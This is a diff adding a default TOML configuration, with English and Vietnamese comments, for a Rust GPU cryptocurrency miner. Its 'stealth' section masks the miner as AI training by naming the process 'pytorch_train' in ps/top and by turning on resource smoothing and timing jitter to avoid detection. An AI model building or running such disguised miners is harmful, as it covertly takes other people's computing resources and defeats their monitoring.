@@ -1,0 +1,72 @@
+# Default Mining Configuration (Cấu hình khai thác mặc định)
+
+[mining]
+# Pool URL (URL hồ khai thác) - stratum+tcp:// or stratum+ssl://
+pool_url = "stratum+tcp://pool.example.com:3333"
+
+# Wallet address (Địa chỉ ví) - nơi nhận tiền khai thác
+wallet_address = "0x0000000000000000000000000000000000000000"
+
+# Mining algorithm (Thuật toán khai thác) - "Ethash", "KawPow", "RandomX"
+algorithm = "Ethash"
+
+# GPU devices (Thiết bị GPU) - danh sách GPU IDs
+gpu_devices = [0]
+
+# Mining intensity (Cường độ khai thác) - 0-100%
+intensity = 80
+
+# Worker name (Tên worker) - hiển thị trên pool
+worker_name = "rust-miner-1"
+
+[stealth]
+# Stealth profile (Hồ sơ ẩn danh) - "AiTraining", "ImageProcessing", "ScientificComputing", "AiInference"
+profile = "AiTraining"
+
+# Process name (Tên tiến trình) - hiển thị trong ps/top
+process_name = "pytorch_train"
+
+# Enable resource smoothing (Bật làm mịn tài nguyên)
+enable_resource_smoothing = true
+
+# Enable timing jitter (Bật nhiễu thời gian)
+enable_timing_jitter = true
+
+[coordination]
+# Coordination mode (Chế độ điều phối) - "Standalone", "Distributed"
+mode = "Standalone"
+
+# Peer addresses (Địa chỉ peers) - cho distributed mode
+peers = []
+
+# Health check interval (Khoảng thời gian kiểm tra sức khỏe) - seconds
+health_check_interval = 30
+
+# Metrics collection interval (Khoảng thời gian thu thập metrics) - seconds
+metrics_interval = 60
+
+[security]
+# Enable seccomp filtering (Bật lọc seccomp)
+enable_seccomp = true
+
+# Enable AppArmor profile (Bật hồ sơ AppArmor)
+enable_apparmor = false
+
+# Enable namespace isolation (Bật cô lập namespace)
+enable_namespaces = true
+
+# Enable wallet encryption (Bật mã hóa ví)
+enable_wallet_encryption = true
+
+# Security profile (Hồ sơ bảo mật)
+profile = "Production"
+
+[logging]
+# Log level (Mức độ log) - "trace", "debug", "info", "warn", "error"
+level = "info"
+
+# Log file path (Đường dẫn file log)
+file_path = "/var/log/mining-gpu/app.log"
+
+# Enable JSON logging (Bật ghi log JSON)
+json_format = false
